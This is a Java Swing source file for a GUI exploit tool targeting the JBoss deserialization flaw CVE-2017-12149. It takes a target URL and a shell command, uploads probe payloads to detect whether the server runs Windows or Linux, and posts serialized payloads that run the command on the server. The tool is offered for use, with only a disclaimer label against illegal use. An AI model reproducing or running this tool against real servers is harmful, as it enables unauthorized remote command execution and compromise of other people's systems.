package com.jboss.main;

import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

import java.awt.GridLayout;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JTextField;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.awt.event.ActionEvent;
import javax.swing.JLabel;
import java.awt.Font;
import javax.swing.SwingConstants;
import javax.swing.JTextArea;
import javax.swing.JComboBox;
import javax.swing.JTextPane;
import javax.swing.JScrollPane;

public class main {

	
	private JFrame frmCveJboosAs;
	private JTextField server;
	private JTextField cmd;
	Payload payload = new Payload();
	String result = null;
	byte[] Payload = null;
	String os = "";
	
	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					main window = new main();
					window.frmCveJboosAs.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 * @wbp.parser.entryPoint
	 */
	public main() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {

		frmCveJboosAs = new JFrame();
		frmCveJboosAs.setTitle("CVE-2017-12149  Jboss反序列化 V1.0");
		frmCveJboosAs.setBounds(100, 100, 588, 528);
		frmCveJboosAs.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frmCveJboosAs.getContentPane().setLayout(null);
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setBounds(10, 93, 546, 364);
		frmCveJboosAs.getContentPane().add(scrollPane);
		
		final JLabel info = new JLabel("仅供学习交流使用,切勿用于非法用途，否则后果自负! by:云絮");
		info.setBounds(20, 463, 505, 18);
		frmCveJboosAs.getContentPane().add(info);
		
		final JTextArea textArea = new JTextArea();
		textArea.setLineWrap(true);
		scrollPane.setViewportView(textArea);
		
		JButton btnNewButton = new JButton("2.执行");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {

					String jboss_ip = server.getText();
					String command = cmd.getText(); 
					if ("".equals(os)) {
						info.setText("请先检测是否存在漏洞");
						return;
					}
					try {
						Payload  = payload.PayloadGeneration(command,os);
					}catch (Exception e) {  
						info.setText("执行出现异常:"+e.toString());
				    }
					try {
						result = doPost.DoPost(jboss_ip, Payload);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						info.setText("执行出现异常:"+e.toString());
						e.printStackTrace();
					}
					textArea.setText("");
					textArea.setText(result.trim().substring(9).trim());
			}
		});
		btnNewButton.setBounds(454, 50, 102, 30);
		
		frmCveJboosAs.getContentPane().add(btnNewButton);
		JButton btnNewButton_1 = new JButton("1.检测");
		btnNewButton_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					String jboss_ip = server.getText();
					String command = cmd.getText(); 
					
					Payload = payload.upload("windows");
					try {
						result = doPost.DoPost(jboss_ip, Payload);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						info.setText("执行出现异常:"+e.toString());
						e.printStackTrace();
					}
					Payload = payload.upload("Linux");
					try {
						result = doPost.DoPost(jboss_ip, Payload);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						info.setText("执行出现异常:"+e.toString());
						e.printStackTrace();
					}
					
					Payload  = payload.PayloadGeneration(command,"windows");
					result=doPost.DoPost(jboss_ip, Payload);
					System.out.println(result);
					if("".equals(result)) {
						Payload  = payload.PayloadGeneration(command,"linux");
						result=doPost.DoPost(jboss_ip, Payload);
					}
					
					if("".equals(result.trim())){
						info.setText("漏洞不存在");
						return;
					}
					
//					
					try {
					String res_os=result.trim().substring(0, 9);
					
					if (res_os.equals("[L291919]")){
						os="linux";
						info.setText("存在漏洞,系统是:linux");
					}else if(res_os.equals("[W291013]")){
						os="windows";
						info.setText("存在漏洞,系统是:windows");
					}
					}catch(Exception e){
						textArea.setText(result);
						info.setText("执行出现异常:"+e.toString());
					}	
				} catch (ClassNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (NoSuchMethodException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (InstantiationException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IllegalAccessException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IllegalArgumentException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (InvocationTargetException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (NoSuchFieldException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
		btnNewButton_1.setBounds(454, 15, 102, 27);
		frmCveJboosAs.getContentPane().add(btnNewButton_1);
		
		server = new JTextField();
		server.setText("http://127.0.0.1:8080");
		server.setBounds(42, 13, 396, 30);
		frmCveJboosAs.getContentPane().add(server);
		server.setColumns(10);
		
		cmd = new JTextField();
		cmd.setText("whoami");
		cmd.setColumns(10);
		cmd.setBounds(42, 49, 396, 30);
		frmCveJboosAs.getContentPane().add(cmd);
		
		JLabel lblurl = new JLabel("目标:");
		lblurl.setBounds(10, 18, 102, 18);
		frmCveJboosAs.getContentPane().add(lblurl);
		
		JLabel lblip = new JLabel("cmd：");
		lblip.setBounds(10, 55, 102, 18);
		frmCveJboosAs.getContentPane().add(lblip);
		
		
		
		

	}
}
